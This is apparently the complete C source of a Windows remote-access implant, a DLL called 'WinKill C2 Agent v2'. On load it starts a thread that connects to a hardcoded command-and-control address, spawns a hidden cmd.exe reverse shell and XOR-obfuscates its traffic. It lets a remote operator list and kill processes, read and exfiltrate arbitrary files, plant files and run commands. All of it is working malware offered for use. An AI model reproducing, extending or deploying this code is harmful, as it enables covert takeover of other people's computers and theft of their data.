/*
 * WinKill C2 Agent v2 - Fixed multiplexing
 * =========================================
 * Single reader thread dispatches ALL frames.
 * Shell stdin written directly from dispatcher (no separate reader thread).
 * Shell stdout bridged via per-job thread.
 */

#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifndef C2_IP
#define C2_IP   0xA766A8C0
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif

#define CHAN_CTRL     0x00000000
#define CHAN_SHELL_B  0x10000000
#define CHAN_SHELL(id) (CHAN_SHELL_B | (id))

#define MSG_HEARTBEAT   0x00
#define MSG_STATUS      0x01
#define MSG_SHUTDOWN    0x02
#define MSG_SHELL_SPAWN 0x10
#define MSG_SHELL_DATA  0x11
#define MSG_SHELL_KILL  0x12
#define MSG_PROC_LIST   0x20
#define MSG_PROC_KILL   0x21
#define MSG_BIN_EXEC    0x40
#define MSG_FILE_GET    0x50
#define MSG_FILE_PUT    0x51
#define MSG_FILE_DATA   0x52

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};
static void X(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

typedef struct Job {
    DWORD  id, ch;
    HANDLE hp, ht, hi, ho;  // process, thread, stdin-write, stdout-read
    BYTE   on;
    struct Job *nx;
} Job;

static Job      *g_j  = NULL;
static DWORD     g_nid = 1;
static SOCKET    g_sk = INVALID_SOCKET;
static volatile LONG g_r = 1;
static CRITICAL_SECTION g_l;

// ============================================================
// Frame I/O
// ============================================================
static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    if (!b) return -1;
    *(DWORD *)(b)     = tl;
    *(DWORD *)(b + 4) = ch;
    *(BYTE  *)(b + 8) = t;
    if (d && n) memcpy(b + 9, d, n);
    X(b + 4, tl);
    int r = send(g_sk, (char *)b, tl + 4, 0);
    HeapFree(GetProcessHeap(), 0, b);
    return r;
}

static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    DWORD tl;
    if (recv(g_sk, (char *)&tl, 4, 0) != 4) return -1;
    if (tl > 0x100000 || tl < 5) return -1;

    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;

    DWORD got = 0;
    while (got < tl) {
        int r = recv(g_sk, (char *)b + got, tl - got, 0);
        if (r <= 0) { HeapFree(GetProcessHeap(), 0, b); return -1; }
        got += r;
    }

    X(b, tl);
    *ch = *(DWORD *)(b);
    *t  = *(BYTE  *)(b + 4);
    *n  = tl - 5;
    if (*n > 0) {
        *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n);
        if (*d) memcpy(*d, b + 5, *n);
    } else *d = NULL;

    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

// ============================================================
// Job Table
// ============================================================
static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;
    j->id = g_nid++; j->ch = ch; j->on = 1;
    EnterCriticalSection(&g_l); j->nx = g_j; g_j = j; LeaveCriticalSection(&g_l);
    return j;
}
static Job *JF(DWORD ch) {
    Job *j = g_j;
    while (j) { if (j->ch == ch && j->on) return j; j = j->nx; }
    return NULL;
}
static void JK(Job *j) {
    if (!j || !j->on) return; j->on = 0;
    if (j->hp) { TerminateProcess(j->hp, 0); CloseHandle(j->hp); }
    if (j->ht) CloseHandle(j->ht);
    if (j->hi) CloseHandle(j->hi);
    if (j->ho) CloseHandle(j->ho);
}

// Zombie reaper
static void RP(void) {
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) {
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) JK(j);
        j = j->nx;
    }
    LeaveCriticalSection(&g_l);
}

// ============================================================
// Stdout bridge: cmd.exe stdout → framed TX to C2
// ============================================================
static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p;
    BYTE b[8192]; DWORD n;
    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0) {
        Tx(j->ch, MSG_SHELL_DATA, b, n);
    }
    return 0;
}

// ============================================================
// Spawn shell: creates cmd.exe with pipes, starts stdout bridge
// (NO stdin bridge thread - dispatcher writes directly to j->hi)
// ============================================================
static Job *SP(DWORD ch) {
    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r1, &w1, &sa, 0)) return NULL;
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1); return NULL;
    }

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags     = 0x101;  // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    si.wShowWindow = 0;
    si.hStdInput   = r1;
    si.hStdOutput  = w2;
    si.hStdError   = w2;

    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                        0x08000000, NULL, NULL, &si, &pi)) {
        CloseHandle(r1); CloseHandle(w1);
        CloseHandle(r2); CloseHandle(w2);
        return NULL;
    }
    CloseHandle(r1);   // child reads from pipe
    CloseHandle(w2);   // child writes to pipe

    Job *j = JN(ch);
    if (!j) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(w1); CloseHandle(r2);
        return NULL;
    }

    j->hp = pi.hProcess;
    j->ht = pi.hThread;
    j->hi = w1;   // write-end of stdin pipe
    j->ho = r2;   // read-end of stdout pipe

    CreateThread(NULL, 0, SO, j, 0, NULL);  // stdout → C2
    return j;
}

// ============================================================
// Process listing
// ============================================================
static void PS(void) {
    char b[8192] = {0}; int p = 0;
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return;

    p += wsprintfA(b + p, "%-8s %-6s %s\r\n", "PID", "PPID", "Name");
    p += wsprintfA(b + p, "------------------------\r\n");

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            int r = (int)sizeof(b) - p - 128;
            if (r < 0) break;
            p += wsprintfA(b + p, "%-8lu %-6lu %s\r\n",
                          pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn);
    Tx(CHAN_CTRL, MSG_PROC_LIST, b, p);
}

static void PK(const char *s) {
    DWORD pi = (DWORD)atoi(s);
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pi);
    char m[128];
    if (h) { TerminateProcess(h, 0); CloseHandle(h); wsprintfA(m, "Killed PID %lu\r\n", pi); }
    else   { wsprintfA(m, "Failed PID %lu\r\n", pi); }
    Tx(CHAN_CTRL, MSG_PROC_KILL, m, (DWORD)strlen(m));
}

// ============================================================
// Frame Dispatcher - SINGLE reader, routes to correct handler
// ============================================================
// Called from main loop for each received frame
static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    // Check if this is shell data → write directly to job's stdin
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
        Job *j = JF(ch);
        if (j && j->on && d) {
            DWORD w;
            WriteFile(j->hi, d, n, &w, NULL);
        }
        if (d) HeapFree(GetProcessHeap(), 0, d);
        return;
    }

    // Control channel messages
    switch (t) {
    case MSG_HEARTBEAT:
        break;

    case MSG_SHUTDOWN:
        g_r = 0;
        break;

    case MSG_SHELL_SPAWN:
        if (n >= 4) {
            DWORD nc = *(DWORD *)d;
            Job *j = SP(nc);
            char r[64];
            int l = wsprintfA(r, "OK shell ch=%08X id=%lu\r\n", nc, j ? j->id : 0);
            Tx(CHAN_CTRL, MSG_STATUS, r, l);
        }
        break;

    case MSG_SHELL_KILL:
        if ((ch & 0xF0000000) == CHAN_SHELL_B) {
            Job *j = JF(ch);
            if (j) JK(j);
        }
        break;

    case MSG_PROC_LIST:
        PS();
        break;

    case MSG_PROC_KILL:
        if (d && n) PK((char *)d);
        break;

    case MSG_FILE_GET:
        // Download file from target: payload = filename
        if (d && n) {
            HANDLE hf = CreateFileA((char*)d, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD sz = GetFileSize(hf, NULL);
                BYTE *fb = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz + 256);
                if (fb) {
                    // Header: filename length(2) + filename + file data
                    WORD fnLen = (WORD)strlen((char*)d);
                    *(WORD*)fb = fnLen;
                    memcpy(fb + 2, d, fnLen);
                    DWORD r;
                    ReadFile(hf, fb + 2 + fnLen, sz, &r, NULL);
                    Tx(CHAN_CTRL, MSG_FILE_DATA, fb, 2 + fnLen + r);
                    HeapFree(GetProcessHeap(), 0, fb);
                }
                CloseHandle(hf);
            } else {
                char e[128];
                int l = wsprintfA(e, "ERROR: Cannot open %s\r\n", (char*)d);
                Tx(CHAN_CTRL, MSG_STATUS, e, l);
            }
        }
        break;

    case MSG_FILE_PUT:
        // Upload file to target: payload = [2B pathLen][path][data]
        if (d && n > 2) {
            WORD pl = *(WORD*)d;
            if (pl < n - 2) {
                char path[MAX_PATH];
                memcpy(path, d + 2, pl); path[pl] = 0;
                HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hf != INVALID_HANDLE_VALUE) {
                    DWORD w;
                    WriteFile(hf, d + 2 + pl, n - 2 - pl, &w, NULL);
                    CloseHandle(hf);
                    char ok[128];
                    int l = wsprintfA(ok, "OK: Wrote %lu bytes to %s\r\n", w, path);
                    Tx(CHAN_CTRL, MSG_STATUS, ok, l);
                }
            }
        }
        break;

    case MSG_BIN_EXEC:
        if (d && n) {
            // Create a temp shell to run command and capture output
            DWORD tmpCh = 0xF0000000 | (GetTickCount() & 0x0FFFFFFF);
            Job *j = SP(tmpCh);
            if (j) {
                // Write command to shell, then exit
                DWORD w;
                WriteFile(j->hi, d, n, &w, NULL);
                char exitCmd[] = "\r\nexit\r\n";
                WriteFile(j->hi, exitCmd, (DWORD)strlen(exitCmd), &w, NULL);
                // Output goes back via stdout bridge on tmpCh
            }
        }
        break;
    }

    if (d) HeapFree(GetProcessHeap(), 0, d);
}

// ============================================================
// Main Agent
// ============================================================
DWORD WINAPI AgentMain(LPVOID param) {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    InitializeCriticalSection(&g_l);

    g_sk = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (g_sk == INVALID_SOCKET) goto done;

    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port   = htons(C2_PORT);
    a.sin_addr.s_addr = C2_IP;

    if (connect(g_sk, (struct sockaddr*)&a, sizeof(a)) != 0) {
        closesocket(g_sk); g_sk = INVALID_SOCKET;
        goto done;
    }

    // Auto-spawn default shell on channel 1
    SP(CHAN_SHELL(1));

    // Main receive loop
    DWORD lr = 0;
    while (g_r) {
        struct timeval tv = {0, 100000};  // 100ms - responsive
        fd_set f; FD_ZERO(&f); FD_SET(g_sk, &f);

        if (select(0, &f, NULL, NULL, &tv) > 0) {
            DWORD ch; BYTE t; BYTE *d; DWORD n;
            if (Rx(&ch, &t, &d, &n) == 0) {
                Dispatch(ch, t, d, n);
            } else {
                break;
            }
        }

        if (GetTickCount() - lr > 30000) { RP(); lr = GetTickCount(); }  // every 30s
    }

done:
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) { Job *nx = j->nx; JK(j); j = nx; }
    LeaveCriticalSection(&g_l);

    if (g_sk != INVALID_SOCKET) closesocket(g_sk);
    WSACleanup();
    DeleteCriticalSection(&g_l);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CloseHandle(CreateThread(NULL, 0, AgentMain, NULL, 0, NULL));
    }
    return TRUE;
}
